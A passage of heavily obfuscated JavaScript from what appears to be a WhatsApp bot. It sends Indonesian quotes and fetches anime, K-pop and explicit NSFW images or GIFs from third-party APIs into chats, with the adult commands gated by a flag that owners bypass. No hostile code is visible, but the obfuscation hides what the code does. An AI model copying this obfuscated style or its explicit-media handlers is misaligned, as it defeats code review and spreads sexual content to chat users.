+_0x406083(0x575,0x722,0x818,0x676)+_0x406083(0x447,0x585,-0x13,0x2cc)+_0x406083(0x473,0x8ac,0x1d9,0x8bf)+_0x4aaba1(0xc5c,0xa3e,0xafb,0xa70)+_0x406083(0x647,0x6c1,0xa35,0xa36)+'wanita\x20sam'+'a\x20dengan\x20m'+'endidik\x20se'+_0x406083(0x718,0xa23,0x662,0x20c)+_0x406083(0xd24,0xd1d,0xdec,0x1066),_0x4aaba1(0xb7b,0xe70,0xb89,0xc6d)+'tengah\x20jam'+'\x20per\x20hari\x20'+_0x4aaba1(0x596,0x997,0x698,0x444)+'engan\x20memb'+_0x4aaba1(0xc8c,0xc6c,0x10bf,0x86b)+_0x406083(0xd2c,0x105f,0xc2d,0xdfc)+'i','Bila\x20Anda\x20'+_0x4aaba1(0x4d1,0x7ae,0x6d7,0x479)+'gan\x20takut\x20'+_0x4aaba1(0xb9f,0x699,0xf08,0x702)+_0x406083(0x385,0x34,0x396,0x75d)+_0x406083(0x3b7,0x322,0x30c,0x338)+_0x4aaba1(0x52c,0x4ee,0x231,0x1f0)+_0x4aaba1(0x64c,0x54c,0x780,0x39a)+_0x4aaba1(0xdc7,0xea8,0x97c,0x9aa)+_0x406083(0xd9b,0x11c1,0x10f2,0xe8d),_0x406083(0x8bd,0xafe,0x763,0x75d)+'\x20suka\x20sama'+_0x4aaba1(0x4f6,0x3fa,0xb3,0x41a)+'g\x20sok\x20tau,'+_0x4aaba1(0x76f,0xbc4,0x923,0xb8b)+'omong\x20tapi'+_0x406083(0x42f,0x4f6,0x368,0x60e)+_0x406083(0x832,0x480,0xa05,0xc08)+_0x4aaba1(0xa20,0xbe6,0x948,0x562)+_0x406083(0xb62,0xf51,0xa62,0xa33)+_0x4aaba1(0x849,0x7fd,0x909,0xc31)+_0x406083(0x900,0x7ca,0xc23,0x778)+_0x406083(0x663,0x9e8,0x9d4,0x913)+'endiri',_0x406083(0xcbc,0x935,0xfe6,0xb6f)+_0x406083(0x745,0x7cd,0xc67,0x2e3)+_0x4aaba1(0x984,0xd48,0x533,0xa4f)+'yang\x20membu'+_0x4aaba1(0xa0e,0xeef,0x639,0xd35)+'rbelalak\x20a'+_0x406083(0xb8a,0x107c,0xef5,0xde7)+_0x406083(0x436,0x126,-0x25,0x30a)+_0x406083(0xceb,0x112f,0xe6f,0x8b7)+_0x4aaba1(0xc3c,0xd04,0xf00,0x10b0)+_0x406083(0xd2e,0xa73,0x11ec,0xd30)+_0x406083(0xb65,0xb2d,0x972,0x8ef),'Cinta\x20adal'+'ah\x20pengorb'+_0x406083(0x746,0x6d7,0x9ff,0xa97)+_0x406083(0x3b5,0x3a0,0x77b,0x62a)+_0x406083(0xbaf,0xe61,0x101a,0x8f0)+'lu\x20sih\x20nam'+_0x4aaba1(0x50c,0xca,0x9e0,0x2af)+'ritaan',_0x4aaba1(0x982,0x4d4,0x7c3,0x605)+_0x406083(0x3d1,0x694,0x732,0x47a)+_0x4aaba1(0x778,0xa38,0x82b,0x448)+_0x4aaba1(0x83f,0xc6c,0x780,0x6c4)+_0x4aaba1(0x52b,0x377,0x428,0x618)+'an\x20pacar,\x20'+_0x4aaba1(0xc13,0xf7a,0x7f0,0x7d5)+'\x20kamu\x20putu'+_0x406083(0xa7e,0x611,0x856,0xd2e)+_0x406083(0x4e6,0x600,0x262,0x528)+'ian',_0x406083(0x8bd,0x4df,0x3be,0x9a4)+_0x406083(0x50d,0x28e,0x8d5,0x6a6)+_0x4aaba1(0xbba,0xfda,0xd62,0xa54)+_0x4aaba1(0xd4a,0xce7,0xff0,0xd8f)+_0x4aaba1(0x56e,0xa87,0x3e8,0x2e3)+'\x20hanya\x20dua'+'\x20di\x20dunia\x20'+'ini,\x20Tuhan'+_0x4aaba1(0x690,0x8b7,0x703,0x347)+'sangan\x20hid'+'up\x20saya',_0x406083(0xd16,0xd80,0x988,0xcb8)+_0x4aaba1(0x978,0xe7d,0x7aa,0x978)+'anda\x20menja'+'di\x20ringan,'+_0x406083(0x9c3,0xb28,0xafb,0x953)+'rah.\x20Saya\x20'+_0x4aaba1(0xa63,0x555,0xada,0xee7)+_0x4aaba1(0x75b,0x450,0xa1d,0xa69)+_0x4aaba1(0x44d,0x1e8,0x81c,0x93)+'tua\x20saya,\x20'+'dan\x20hidup\x20'+_0x406083(0x42d,0x243,0x390,0x11f)+_0x4aaba1(0x3c3,0x646,0x21d,0x8a2),'Ketika\x20kam'+_0x4aaba1(0x8bf,0xc63,0xd72,0xb48)+_0x406083(0x996,0x99b,0x5ed,0x7c7)+_0x406083(0xc0e,0x965,0xaeb,0x954)+_0x4aaba1(0xba4,0xb34,0x9fb,0xeb6)+_0x4aaba1(0x714,0x710,0x451,0x210)+'\x20tahu\x20adal'+_0x4aaba1(0x61d,0x544,0xa51,0x557)+'ang\x20kamu\x20a'+_0x4aaba1(0x43c,0x379,0x640,0x720)+_0x4aaba1(0x4b9,0x802,0x7c9,0x1c3)+_0x406083(0x786,0x927,0x295,0xbb9)+'ari\x20Tuhan',_0x406083(0x866,0xbe3,0xc49,0xd2f)+_0x406083(0x571,0x45b,0x6d4,0x88e)+'ting?\x20Taku'+'t\x20itu\x20mene'+_0x406083(0xbc0,0xa6a,0x77a,0xa21)+_0x4aaba1(0xd45,0xb0d,0xdc9,0x1142)+_0x4aaba1(0x4dd,0x3d0,0x6a4,0x96f),_0x4aaba1(0xd3a,0xdd1,0x108a,0xf04)+_0x406083(0xb43,0xadc,0x954,0xfbd)+_0x4aaba1(0x7df,0xb73,0xc2e,0x554)+_0x4aaba1(0x99c,0xc11,0xbba,0x9df)+'sa\x20menghas'+_0x406083(0x751,0xc03,0xb9c,0x79d)+_0x406083(0xd03,0xe18,0x857,0x99d)+_0x4aaba1(0x917,0x4ae,0x85c,0x975)+_0x406083(0x775,0x8b0,0x48f,0xa92)+_0x4aaba1(0xbc9,0x82f,0xce2,0xbb8)+_0x406083(0x639,0x65e,0x563,0x7df)+_0x406083(0x42e,0x8ab,0x20a,0x290)+'bulannya',_0x406083(0x895,0x4ca,0x5dd,0x52c)+_0x4aaba1(0xd40,0x114c,0x1074,0x953)+_0x4aaba1(0xd2f,0x971,0xc6c,0xd10)+_0x4aaba1(0x76b,0xbd1,0x562,0x6bf)+_0x406083(0xca2,0x940,0xc9e,0x78c)+_0x4aaba1(0xd6c,0xdb2,0xd08,0xa6d)+_0x4aaba1(0xbbd,0xc5e,0xbdc,0x84d)+_0x406083(0x400,0x6d1,0x67c,0x2a7)+_0x4aaba1(0xc15,0xf32,0x982,0xbf7),_0x406083(0xb32,0x9ee,0xbd8,0xc91)+_0x406083(0x60a,0x3b1,0x90c,0x862)+_0x406083(0x862,0x5dd,0xa51,0x4c1)+_0x4aaba1(0x9ed,0x596,0xe6f,0x9f1)+'ibu\x20pengem'+'is\x20yang\x20ad'+'a\x20di\x20negar'+_0x4aaba1(0xb53,0xd9e,0x680,0x9b4)+',\x20tapi\x20seb'+'uah\x20negara'+_0x406083(0xc45,0xddb,0x9f7,0xa19)+_0x406083(0xa3b,0x80e,0x814,0x63d)+_0x406083(0x66d,0xa2d,0x2d6,0x5b4)+_0x406083(0x979,0x4b4,0xc8c,0x8ff)+_0x406083(0xb1d,0x95b,0xaa8,0xe4d)+_0x406083(0xc32,0xac8,0xdc6,0x7e6)+_0x406083(0xb21,0xffc,0xde5,0xc7a),_0x406083(0xb9d,0xa32,0x7a9,0xa31)+_0x4aaba1(0x83c,0x6f3,0xb7a,0x7d6)+_0x4aaba1(0x8e2,0xafc,0xcd9,0x9d2)+'ang\x20berpua'+'sa\x20tidak\x20m'+_0x406083(0xc8a,0x1182,0x76e,0x7b5)+_0x4aaba1(0x83a,0x9cb,0x4bd,0xa45)+_0x4aaba1(0x813,0x79c,0x413,0x519)+_0x4aaba1(0xc69,0x8ae,0xd92,0x992)+_0x406083(0x558,0xff,0x9ca,0x974)+_0x4aaba1(0xa7d,0xdd9,0xe63,0xe80)+'inum\x20pasti'+_0x406083(0x540,0x6f1,0x8a1,0xe5)+_0x4aaba1(0xa4c,0x783,0xdc1,0xbfd)+_0x406083(0xaa6,0x676,0x71e,0x8d7),_0x406083(0x766,0xb0d,0x459,0x292)+_0x406083(0x816,0x81d,0x942,0x484)+_0x4aaba1(0xc4a,0xa8b,0xa53,0xf53)+_0x406083(0xba5,0x105f,0x9be,0xdf2)+_0x406083(0x440,0x45d,0x860,0x1f4)+'agi\x20pria\x20a'+_0x4aaba1(0x409,0x180,0x7ca,0x598)+_0x4aaba1(0x5d3,0x61a,0x281,0x53e),_0x4aaba1(0x499,0x1a0,0xf1,-0x7)+_0x406083(0xcd7,0x917,0x8fe,0x927)+'jadi\x20orang'+_0x406083(0xb07,0xa4d,0xb15,0x8e0)+_0x4aaba1(0xa32,0x921,0x989,0x9f2)+_0x4aaba1(0x951,0x72f,0x69f,0x617)+'ak\x20takut\x20m'+'enjadi\x20ora'+_0x406083(0xcdd,0x11db,0xe04,0xd42),_0x4aaba1(0xd5b,0x110d,0xefa,0xae9)+_0x406083(0xb87,0xed7,0x807,0x6f3)+'hubunganny'+_0x406083(0x977,0x91b,0x6e7,0xe04)+'aya\x20atau\x20m'+_0x4aaba1(0xd68,0x11f4,0x8b3,0xb2a)+'i,\x20sederha'+_0x4aaba1(0xca7,0xa98,0x803,0xa5e)+_0x4aaba1(0xcbb,0xa4b,0xd58,0xcdc)+_0x406083(0x44c,0x4d0,0x8af,0x87f)+'aksana'],longtong_=longtong[Math['floor'](Math[_0x4aaba1(0xadf,0xefd,0x896,0xc6e)]()*longtong[_0x4aaba1(0x7cc,0x331,0xb65,0x44e)])],_0x4f73fc={};_0x4f73fc['displayTex'+'t']=_0x4aaba1(0x805,0x7a1,0x517,0x57f);const _0x238c2e={};_0x238c2e['buttonId']=_0x4aaba1(0xd52,0x101e,0xdc1,0xfae),_0x238c2e[_0x406083(0x6b4,0x288,0x7f3,0xaca)]=_0x4f73fc,_0x238c2e['type']=0x1;const _0x93e5cf={};_0x93e5cf[_0x4aaba1(0x543,0x935,0xce,0x1d4)+'t']=_0x406083(0x4df,0x4b0,0x8a5,0x63);const _0x1128e5={};_0x1128e5[_0x406083(0x758,0xa2d,0xade,0x40a)]=''+command,_0x1128e5[_0x4aaba1(0x6e9,0x843,0x70d,0x714)]=_0x93e5cf,_0x1128e5[_0x406083(0x7e1,0x365,0x74c,0x79b)]=0x1;var buttonns=[_0x238c2e,_0x1128e5];buttonMessage={'contentText':longtong_,'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+('Next\x20\x20for\x20'+_0x406083(0x85d,0x5a6,0x819,0x789)+'s\x20💞')+enter+_0x406083(0x9a1,0x5e8,0xbe9,0x98f)+sender[_0x4aaba1(0x6ab,0x666,0x423,0x8a9)]('@')[-0x12*0x71+0x5*0x4c1+-0xfd3],'buttons':buttonns,'headerType':0x1};const _0x184662={};_0x184662['text']='hi',_0x184662[_0x406083(0x8cf,0xc87,0xa40,0xafc)+_0x406083(0x973,0x471,0x95d,0xe67)]=0x3b9aca00,_0x184662[_0x406083(0x823,0xba0,0xbe8,0x90a)+'d']=!![],_0x184662[_0x406083(0x43c,0x99,0x7f7,0x74)+_0x4aaba1(0x441,0x16a,0x29d,0x922)]=!![],_0x184662['mentionedJ'+'id']=[sender];const _0x54e0c1={};_0x54e0c1['caption']='Botwea\x20©2k'+'21',_0x54e0c1[_0x4aaba1(0x887,0x7da,0x813,0x4fa)+'o']=_0x184662,_0x54e0c1['quoted']=ftoko,_0x54e0c1[_0x4aaba1(0x471,0x6df,0x71c,0x7e4)+'ral']=!![],alpha['sendMessag'+'e'](from,buttonMessage,MessageType['buttonsMes'+_0x4aaba1(0x4ff,0x980,0x8cd,0x7e7)],_0x54e0c1);break;case _0x4aaba1(0x6eb,0x8f0,0x96b,0x6b7):case _0x406083(0xb55,0xbaa,0x992,0x7af):case _0x406083(0x378,0x485,0xf1,0x62c):case _0x406083(0xcd3,0xf9d,0xa2a,0xe93):case _0x406083(0x588,0xa07,0x85a,0x88f):case _0x406083(0xb2f,0x762,0x611,0xb71):case _0x406083(0x422,0x186,0x949,0xbc):case'hinata':case'inori':case'kaga_kouko':case _0x406083(0x35f,0x2cd,0x649,0x14b)+_0x406083(0x420,0xc4,0x9a,0x845):case _0x406083(0xb25,0xb08,0xde2,0x9c9)+_0x406083(0x6d0,0x3af,0x82d,0x77a):case _0x4aaba1(0x604,0x738,0xa4f,0x85d):case _0x406083(0xcfd,0x885,0x972,0xdab)+'a':case _0x406083(0x46b,0x6cf,0x89e,0x703)+'ayuki':case _0x4aaba1(0xa1b,0xd4c,0xb2b,0x66b)+'ce':case _0x4aaba1(0xc20,0xfe1,0xe07,0xa2e):case _0x4aaba1(0xc8f,0xb9d,0x96f,0xb42)+_0x4aaba1(0xddd,0xd94,0xe3d,0xc6c):case _0x4aaba1(0xa05,0x69d,0x8f9,0x742):case _0x4aaba1(0xaf8,0xba0,0xc49,0xc07):case'sento_isuz'+'u':case _0x406083(0xae0,0xc77,0xd14,0x5d9):case'shiina':case _0x4aaba1(0xa31,0x859,0xa52,0xf52):case'winry':case _0x406083(0x3df,0x605,0x236,0x5c1):case'yuzuki':case _0x406083(0xb1b,0xcb3,0x7fc,0x71a):reply(lang[_0x4aaba1(0x45a,0x607,0x6b4,0x357)]());var anime=await fetchJson(_0x406083(0x936,0xb23,0xc68,0xbab)+_0x406083(0x757,0x895,0xacb,0x398)+'.herokuapp'+_0x406083(0xa0e,0x8ed,0xc71,0x98a)+_0x4aaba1(0x7a7,0x40d,0x33b,0xc51)+command+(_0x406083(0x6af,0x3e3,0xb22,0x288)+'fline'));let random_anime=await getBuffer(anime['result']);const mediaxxxxxx=await alpha[_0x4aaba1(0x3d4,0x208,0x1a3,0x788)+_0x406083(0x4ca,0x2be,0x797,0x427)](from,random_anime,MessageType[_0x4aaba1(0x448,0x943,0x8c7,0x38c)],{'thumbnail':Buffer[_0x406083(0x737,0x5f7,0x90a,0x429)](0x11a+0x89d+-0x9b7)});let bacotluxxxxxx=mediaxxxxxx[_0x4aaba1(0x49c,0x356,0x376,0x22b)][_0x406083(0x8f0,0xa4a,0x6bc,0x682)+_0x4aaba1(0xa98,0xb94,0xeb0,0xb0a)]?mediaxxxxxx[_0x4aaba1(0x49c,0x69a,0x6e4,0x4ed)]['ephemeralM'+_0x406083(0xa63,0x9b3,0x971,0x59a)]:mediaxxxxxx;const _0x1e5c8c={};_0x1e5c8c[_0x4aaba1(0x543,0x338,0x28e,0x711)+'t']=_0x4aaba1(0x48f,0x6a0,0x1df,0x850);const _0x511bb1={};_0x511bb1[_0x4aaba1(0x78d,0x41d,0xa2c,0x640)]=_0x406083(0xd1d,0xb21,0x11d1,0xc3c),_0x511bb1['buttonText']=_0x1e5c8c,_0x511bb1[_0x4aaba1(0x816,0xa74,0x99c,0x41c)]=0x1;const _0x4f5851={};_0x4f5851['displayTex'+'t']=_0x4aaba1(0x514,0x405,0x3da,0x8f);const _0x44c2ce={};_0x44c2ce[_0x4aaba1(0x78d,0x9e1,0x4fb,0x69e)]=''+command,_0x44c2ce['buttonText']=_0x4f5851,_0x44c2ce[_0x4aaba1(0x816,0x8ea,0xa7a,0x808)]=0x1;const buttonsxxxxxx=[_0x511bb1,_0x44c2ce],btnxxxxx__={'contentText':lang[_0x406083(0x72b,0x7df,0x459,0x9c6)](),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+(_0x4aaba1(0x4fa,0x89e,0x111,0x587)+_0x406083(0xc84,0x9e1,0x9d1,0x841))+sender[_0x4aaba1(0x6ab,0x676,0x328,0x29d)]('@')[-0x14ef+-0x1ef0+-0x769*-0x7],'buttons':buttonsxxxxxx,'headerType':0x4,'imageMessage':bacotluxxxxxx[_0x406083(0x467,0x7d3,0x7e2,0x7a7)][_0x406083(0x731,0x2b3,0x3ad,0xc14)+'ge']},_0x5ef0e6={};_0x5ef0e6[_0x4aaba1(0x88d,0x707,0x6c1,0x476)+'id']=[sender];const _0x5c4642={};_0x5c4642[_0x4aaba1(0xce3,0xe05,0x958,0x11c0)]=mek,_0x5c4642[_0x4aaba1(0x887,0x4c2,0xc16,0xc99)+'o']=_0x5ef0e6,alpha['sendMessag'+'e'](from,btnxxxxx__,MessageType[_0x406083(0x9f4,0xe00,0xce3,0xacd)+_0x406083(0x4ca,0x398,0x9d,0x4b4)],_0x5c4642)[_0x406083(0xa96,0x806,0x98e,0xcfb)](_0x4fc235=>{function _0x8f6085(_0x2deb87,_0x1551ce,_0x3c44c5,_0x2ad1c7){return _0x4aaba1(_0x2ad1c7- -0xea,_0x2deb87,_0x3c44c5-0x1b7,_0x2ad1c7-0x16f);}function _0x2b4a60(_0x4a90ae,_0x5495dc,_0x33e2ce,_0x2712a1){return _0x406083(_0x5495dc- -0x3c0,_0x5495dc-0x1c,_0x33e2ce-0xb0,_0x4a90ae);}reply(_0x8f6085(0x960,0x2a0,0x96,0x55f)+_0x8f6085(0x702,-0x76,0x7f4,0x338)+_0x8f6085(-0x139,0x5d,-0x7a,0x360)+'pa\x20saat\x20la'+'gi');});break;case'baekhyung':case _0x406083(0xbb3,0xd8b,0xbce,0xd10)+'o':case _0x4aaba1(0x907,0x93f,0x8eb,0x76f):case _0x406083(0x8e7,0xab1,0xb21,0x836):case _0x4aaba1(0x646,0x22d,0x505,0x7aa):case _0x4aaba1(0xcf0,0xa29,0x7e2,0xcdb):case _0x406083(0xb13,0xeeb,0xa19,0x656):case _0x406083(0xce5,0xe77,0x8ab,0x8ce):case _0x4aaba1(0xbe8,0xae5,0xdd6,0xef8)+'o':case _0x406083(0x526,0x13b,0x7f6,0xbe)+'n':case _0x406083(0xccc,0xd03,0xeae,0x8a5):case'kimnanjoon':case'kimseok':case _0x406083(0xba2,0xf86,0x6ed,0x80f)+'g':case _0x4aaba1(0xc9f,0xbe0,0xd7b,0xb5e):case _0x406083(0x57d,0x3bf,0x964,0x69d):case'parkchanye'+'ol':case _0x4aaba1(0xc01,0x9d8,0x80a,0x738):case'wuyifan':reply(lang[_0x406083(0x425,0x586,-0xa2,0x160)]());var cogan=await fetchJson(_0x4aaba1(0x96b,0xbae,0x772,0x96f)+_0x4aaba1(0x78c,0x88c,0x84a,0x50f)+_0x406083(0x469,0x5c,0x3f4,0x5d7)+_0x406083(0x934,0xe3e,0xcc8,0x5c5)+_0x406083(0xd13,0xc16,0xfbb,0x11ba)+command+(_0x406083(0x6af,0x6f3,0x41a,0x997)+'fline'));let random_cogan=await getBuffer(cogan[_0x406083(0xb19,0x9ff,0xf10,0xa31)]);const mediaxxxxx=await alpha[_0x4aaba1(0x3d4,0x76d,-0xe,0x46d)+_0x4aaba1(0x4ff,0x204,0x5b2,-0x8)](from,random_cogan,MessageType['image'],{'thumbnail':Buffer[_0x406083(0x737,0x83a,0x7b1,0x857)](-0xdf7+-0x10ee*0x1+0x1ee5)});let bacotluxxxxx=mediaxxxxx[_0x4aaba1(0x49c,0x467,0x5fa,0x86e)][_0x406083(0x8f0,0x803,0x83a,0xb72)+_0x4aaba1(0xa98,0xd41,0x585,0x5e5)]?mediaxxxxx[_0x406083(0x467,0x786,0xc1,0x8ee)]['ephemeralM'+'essage']:mediaxxxxx;const _0x3a536a={};_0x3a536a[_0x4aaba1(0x543,0x2b3,0x6b2,0x1c4)+'t']=_0x4aaba1(0x48f,0x83b,0x881,0x18c);const _0x26acb4={};_0x26acb4[_0x406083(0x758,0x41b,0x488,0x720)]='owner',_0x26acb4[_0x4aaba1(0x6e9,0x44d,0x416,0x8be)]=_0x3a536a,_0x26acb4[_0x406083(0x7e1,0x515,0x86a,0x2fc)]=0x1;const _0x18e177={};_0x18e177['displayTex'+'t']='Next\x20➡️';const _0x642f94={};_0x642f94['buttonId']=''+command,_0x642f94[_0x4aaba1(0x6e9,0xace,0x5b6,0x270)]=_0x18e177,_0x642f94[_0x406083(0x7e1,0x34a,0x684,0x7d4)]=0x1;const buttonsxxxxx=[_0x26acb4,_0x642f94],btnxxxx__={'contentText':lang[_0x406083(0x72b,0x700,0x6a6,0x908)](),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+(_0x406083(0x4c5,0x1ae,0x59,0x23e)+_0x406083(0xc84,0xd7e,0x8bb,0x1068))+sender['split']('@')[-0x10a8+-0x2*-0xb74+-0x14*0x50],'buttons':buttonsxxxxx,'headerType':0x4,'imageMessage':bacotluxxxxx['message'][_0x4aaba1(0x766,0x8f0,0x8d7,0xa59)+'ge']},_0x5a8b15={};_0x5a8b15['mentionedJ'+'id']=[sender];const _0x33da41={};_0x33da41[_0x4aaba1(0xce3,0xccc,0xc8a,0x101b)]=mek,_0x33da41[_0x4aaba1(0x887,0x465,0x730,0x3ea)+'o']=_0x5a8b15,alpha[_0x4aaba1(0x8b4,0x437,0xabe,0x957)+'e'](from,btnxxxx__,MessageType[_0x406083(0x9f4,0x5d3,0xbe5,0x92f)+_0x4aaba1(0x4ff,0xac,0x9ff,0x711)],_0x33da41)[_0x406083(0xa96,0x5af,0xc8a,0x732)](_0x26597d=>{function _0x3f6bda(_0x4e3be5,_0x367b6d,_0x5d88f5,_0x469090){return _0x406083(_0x367b6d-0xfb,_0x367b6d-0x131,_0x5d88f5-0x2b,_0x469090);}const _0x59817c={'bScuj':function(_0x1eecd1,_0x3efaaf){return _0x1eecd1(_0x3efaaf);},'zjAXu':'Terjadi\x20ke'+'salahan,\x20c'+_0x3f6bda(0x2a,0x510,0x3ec,0x48f)+_0x3f6bda(0xf0c,0xb4e,0x9ef,0xedf)+'gi'};function _0x49ab16(_0xe40354,_0x8e6e89,_0x2eda00,_0x5b1af1){return _0x406083(_0xe40354-0x39,_0x8e6e89-0x195,_0x2eda00-0x32,_0x8e6e89);}_0x59817c[_0x49ab16(0x7e4,0x310,0xc7a,0xbcd)](reply,_0x59817c[_0x3f6bda(0x66c,0x838,0x4a6,0xaa6)]);});break;case _0x4aaba1(0x666,0xa0f,0x26e,0x6fc):case _0x4aaba1(0x6ac,0x935,0x96b,0x3de):case _0x4aaba1(0xb39,0x9ae,0xdbb,0x7c7):case _0x406083(0xc85,0xc3e,0xa98,0xa19):case _0x406083(0xc1b,0xc7d,0x750,0x76c):case _0x4aaba1(0xbea,0xdc7,0xbd9,0xf7d):case _0x4aaba1(0xaf4,0xf79,0x8c5,0xc90):case'jahy':case _0x406083(0x8c0,0x94f,0xbd7,0x6e8):case'masturbati'+'on':case _0x406083(0x58b,0x786,0x2fb,0x4a9):case _0x406083(0x3bc,0x2e1,0x5b,0x270):case _0x4aaba1(0x7b0,0x999,0x7bf,0x87f):case _0x406083(0x7e6,0x6c7,0x2cb,0x9c6):case _0x406083(0xd64,0xf83,0x8b1,0xfd6):if(!isNsfw)return reply(lang[_0x4aaba1(0x71c,0x46a,0x674,0x65b)]());reply(lang[_0x406083(0x425,-0xf1,0x92b,0x8dd)]());var nsfww=await fetchJson(_0x406083(0x936,0x468,0xb7e,0x830)+_0x4aaba1(0x78c,0x33d,0xbb3,0xba9)+'.herokuapp'+'.com/api/n'+_0x4aaba1(0x84e,0x7ec,0x5e8,0x883)+command+('?apikey=of'+'fline'));let random_nsfww=await getBuffer(nsfww[_0x4aaba1(0xb4e,0x68e,0xf97,0xa37)]);const mediaxxxx=await alpha[_0x4aaba1(0x3d4,0x7e2,0x387,0x7d4)+_0x406083(0x4ca,0x22e,0x171,0x24f)](from,random_nsfww,MessageType[_0x4aaba1(0x448,0x459,0x8fa,0xf6)],{'thumbnail':Buffer[_0x4aaba1(0x76c,0x676,0x794,0x449)](-0x1d6c+0x160e+0x29*0x2e)});let bacotluxxxx=mediaxxxx['message'][_0x4aaba1(0x925,0x6a9,0x676,0x917)+_0x4aaba1(0xa98,0x73f,0xec1,0xaa6)]?mediaxxxx['message'][_0x406083(0x8f0,0xd3b,0xc04,0xa5a)+_0x4aaba1(0xa98,0x849,0xc4a,0xa95)]:mediaxxxx;const _0x191a53={};_0x191a53[_0x406083(0x50e,0x689,0xa29,0x5b4)+'t']=_0x4aaba1(0x48f,-0x5c,-0x7c,0x5fa);const _0x154f02={};_0x154f02[_0x406083(0x758,0x2e3,0x7df,0xa94)]=_0x406083(0xd1d,0xbb4,0xf19,0x106f),_0x154f02[_0x406083(0x6b4,0x500,0xbc9,0x741)]=_0x191a53,_0x154f02[_0x4aaba1(0x816,0x5e3,0xbd2,0x857)]=0x1;const _0x4df84f={};_0x4df84f[_0x406083(0x50e,0x78e,0x26a,0x64c)+'t']=_0x4aaba1(0x514,0x2cc,0x888,0x357);const _0x29d2a7={};_0x29d2a7[_0x406083(0x758,0x57b,0x895,0xa08)]=''+command,_0x29d2a7[_0x4aaba1(0x6e9,0x9ec,0x4a0,0x252)]=_0x4df84f,_0x29d2a7[_0x406083(0x7e1,0x718,0xb17,0x6ff)]=0x1;const buttonsxxxx=[_0x154f02,_0x29d2a7],btnxxx__={'contentText':lang[_0x406083(0x72b,0xb67,0x32e,0x6e1)](),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+(_0x406083(0x4c5,0x5d2,0x111,0xd0)+_0x406083(0xc84,0xc2e,0xd33,0x805))+sender[_0x406083(0x676,0x2cd,0xb5f,0x7ce)]('@')[0xc3b+-0x5*-0x51f+0x12eb*-0x2],'buttons':buttonsxxxx,'headerType':0x4,'imageMessage':bacotluxxxx[_0x406083(0x467,0x90f,0xbd,0xcc)][_0x406083(0x731,0x8b0,0x3c5,0x3f8)+'ge']},_0x38ac2e={};_0x38ac2e[_0x406083(0x858,0xbd0,0x5a1,0x477)+'id']=[sender];const _0x1f430c={};_0x1f430c[_0x406083(0xcae,0x1141,0xa22,0xe6e)]=mek,_0x1f430c['contextInf'+'o']=_0x38ac2e,alpha['sendMessag'+'e'](from,btnxxx__,MessageType[_0x406083(0x9f4,0x690,0xf14,0xa56)+_0x406083(0x4ca,0x3fa,0x1bb,0x84)],_0x1f430c)['catch'](_0x468090=>{function _0x347fc3(_0x529336,_0xe25cb9,_0xd647d8,_0x396f91){return _0x4aaba1(_0x529336- -0x255,_0x396f91,_0xd647d8-0x112,_0x396f91-0x3d);}const _0x383348={'ZBwdK':function(_0x549047,_0x2e5fad){return _0x549047(_0x2e5fad);},'CjAYa':'Terjadi\x20ke'+_0xb406f1(0x329,0x29c,0x764,-0x1b8)+_0x347fc3(0x1f5,0x16,0x172,-0x326)+'pa\x20saat\x20la'+'gi'};function _0xb406f1(_0x3c15fa,_0x32073e,_0x2458ab,_0x553ecf){return _0x4aaba1(_0x3c15fa- -0xf9,_0x2458ab,_0x2458ab-0xbb,_0x553ecf-0x19a);}_0x383348[_0x347fc3(0x13b,0x27,-0x21b,0x146)](reply,_0x383348[_0xb406f1(0xb21,0x870,0xa01,0x875)]);});break;case _0x4aaba1(0xd10,0x1186,0x8d0,0xac8):case'smug':case _0x4aaba1(0x4d2,0x9df,0x4fc,-0x1f):case'cum':case'slap':case _0x406083(0x5fb,0x3b0,0x10a,0x2ee):case _0x4aaba1(0x5be,0x266,0x58b,0x500):case'bj':case _0x4aaba1(0xa66,0x974,0xc9b,0x563):case _0x4aaba1(0xcd5,0xeb4,0xea3,0xdc5):case _0x4aaba1(0x8a6,0xbc2,0x64f,0x662):case _0x406083(0x869,0x64c,0xb4e,0x4ee):case _0x406083(0xd5d,0x11b7,0xa82,0x11dd)+'gif':case'pussy':case _0x4aaba1(0xc77,0xe2b,0xb54,0xb4b):case _0x4aaba1(0xaa5,0xe66,0xf71,0xc50):case'hug,':case'kiss':case'tickle':case _0x406083(0x7b8,0xc21,0x5f6,0x688):case'kuni':case _0x4aaba1(0x963,0x983,0x44d,0x5a1):case'boobs':case'anal':case _0x4aaba1(0x8a7,0x3ee,0xdbb,0x914):if(!isNsfw&&!mek['key'][_0x406083(0xd3c,0xe51,0xccc,0xabb)]&&!isOwner&&!isCreator)return reply(lang['nsfwmo']());var ini_gif=await fetchJson(_0x406083(0x654,0x99f,0x818,0x2e1)+_0x406083(0xb77,0xbeb,0x6b9,0x1050)+_0x406083(0x911,0x9c2,0x740,0x55f)+command),ini_gif_=await getBuffer(ini_gif['url']);const mediax_=await alpha[_0x406083(0x39f,0x9a,0x118,0x302)+_0x406083(0x4ca,0x85e,0x14d,0x50f)](from,ini_gif_,MessageType['video'],{'thumbnail':Buffer[_0x406083(0x737,0x74e,0xb4a,0x82f)](0x21ab+-0x1d8c+-0x5*0xd3)});let bacotlux_=mediax_[_0x4aaba1(0x49c,-0x1b,0x149,0x2f8)]['ephemeralM'+_0x4aaba1(0xa98,0x7e8,0xc74,0x6f7)]?mediax_[_0x406083(0x467,0x65b,0x19b,0x4e4)][_0x406083(0x8f0,0x881,0x5a2,0xbfb)+_0x406083(0xa63,0x844,0xa6c,0x5b8)]:mediax_;const _0x221a58={};_0x221a58[_0x4aaba1(0x543,0x59e,0x42d,0x3bd)+'t']='🐨\x20Owner';const _0x17477c={};_0x17477c[_0x4aaba1(0x78d,0x55e,0x8d6,0x88f)]='owner',_0x17477c[_0x406083(0x6b4,0x709,0x1d3,0x6e7)]=_0x221a58,_0x17477c['type']=0x1;const _0x45296c={};_0x45296c['displayTex'+'t']='Sewa\x20☕';const _0x421c0a={};_0x421c0a[_0x406083(0x758,0x792,0x291,0xc7d)]=_0x406083(0x7f1,0x69c,0x8d4,0x4af),_0x421c0a[_0x406083(0x6b4,0x1ab,0x6e7,0x743)]=_0x45296c,_0x421c0a['type']=0x1;const 